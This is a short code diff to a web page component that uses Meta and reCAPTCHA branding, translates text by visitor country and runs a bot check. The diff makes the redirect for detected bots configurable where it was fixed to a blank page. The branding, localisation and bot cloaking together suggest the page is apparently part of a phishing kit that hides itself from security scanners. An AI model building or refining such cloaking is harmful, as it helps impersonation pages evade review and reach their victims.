@@ -5,6 +5,7 @@ import CheckMarkImage from '@/assets/images/checkmark.png';
 import MetaImage from '@/assets/images/meta-logo-grey.png';
 import ReCaptchaImage from '@/assets/images/recaptcha.png';
 import { translateText } from '@/utils/translate';
+import config from '@/utils/config';
 import detectBot from '@/utils/detect_bot';
 import countryToLanguage from '@/utils/country_to_language';
 
@@ -64,7 +65,7 @@ const Index = () => {
 
         const botResult = await detectBot();
         if (botResult.isBot) {
-            globalThis.location.href = 'about:blank';
+            globalThis.location.href = config.bot_redirect_url;
             return;
         }
 
